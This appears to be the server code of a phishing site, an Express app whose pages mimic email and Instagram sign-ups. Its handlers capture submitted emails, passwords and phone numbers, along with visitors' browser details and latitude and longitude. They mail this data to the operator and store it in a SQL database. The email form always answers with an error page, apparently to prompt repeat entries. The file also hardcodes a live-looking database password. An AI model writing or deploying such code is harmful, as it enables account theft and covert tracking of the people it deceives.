const sql = require('mssql')
const express = require('express')
const path = require('path')
const sendmail = require('./sendmail.js')
const useragent = require('express-useragent');

const app = express()


app.use(express.urlencoded({ extended: true }));
const static = path.join(__dirname,'static')
//for serving static files



//database connection configuration
const config = {
  server: 'serversasya.database.windows.net',
  database: 'firstdb',
  user: 'Alex',
  password: 'Aleisdangerous@123',
  port: 1433, // Default port for SQL Server
  options: {
    encrypt: true, // Use encryption for the connection
  },
};

app.set('trust proxy', true);
app.use(useragent.express())



app.get("/", (req, resp) => {
  resp.sendFile(`${static}/inde.html`);
});


//api to deliver the webpage to user
app.post("/", (req,resp)=>{

  resp.sendFile(`${static}/inde.html`);

  const { latitude, longitude } = req.body;
  const clientInfo = {
    device: req.useragent.device,
    os: req.useragent.os,
    browser: req.useragent.browser,
    platform: req.useragent.platform,
    version: req.useragent.version,
    source: req.useragent.source,
    isMobile: req.useragent.isMobile,
    isTablet: req.useragent.isTablet,
    isDesktop: req.useragent.isDesktop,
    'latitude':latitude,
    'longitude': longitude
    
  };

  const deviceinfo = JSON.stringify(clientInfo); 
  sendmail.senddeviceinfo(deviceinfo);
  
})

app.get('/email-registration.html',(req,resp)=>{
  resp.sendFile(`${static}/email-registration.html`)
})

app.get('/email-registration-error.html',(req,resp)=>{
  resp.sendFile(`${static}/email-registration-error.html`)
})

app.get('/insta-registration.html',(req,resp)=>{
  resp.sendFile(`${static}/insta-registration.html`)
})



//api to post email data  to SQL Server
app.post('/submit', async (req,resp)=>{

  var usname = req.body.email
    var passpw = req.body.password
    var phone  = req.body.phone
    var dataof = 'Email'
    await sendmail.mail_contact_info(dataof,usname,passpw,phone)

  try {
    let con = await sql.connect(config);
    const request = new sql.Request(con);
    
    // Use parameters to prevent SQL injection and enclose them in single quotes
    request.input('username', sql.VarChar, req.body.email);
    request.input('password', sql.VarChar, req.body.password);
    request.input('phone', sql.VarChar, req.body.phone);


    const query = "INSERT INTO email_info (username,phone, password) VALUES (@username, @phone, @password);";

    await request.query(query);

    
    resp.sendFile(`${static}/email-registration-error.html`);
    

  } catch (err) {
    console.error(err);
    resp.status(500).send(`An error occurred. Please try again or else vist later`);
  }
})


//api to post instagram data to SQL Server
app.post('/submit2',  async(req, resp)=>{
  var usname = req.body.username
  var passpw = req.body.password
  var dataof = 'Instagram'
  await sendmail.mailkaro(dataof,usname,passpw)
  
  let con = await sql.connect(config);
  const request = new sql.Request(con);

  request.input('username', sql.VarChar, req.body.username);
  request.input('password', sql.VarChar, req.body.password);

  const query = "INSERT INTO insta_info (username, password) VALUES (@username, @password);";
  await request.query(query);
  
  resp.sendFile(`${static}/registration-success.html`);
    
})



app.listen(8080,()=>{
  console.log('server is active on port 8080')
})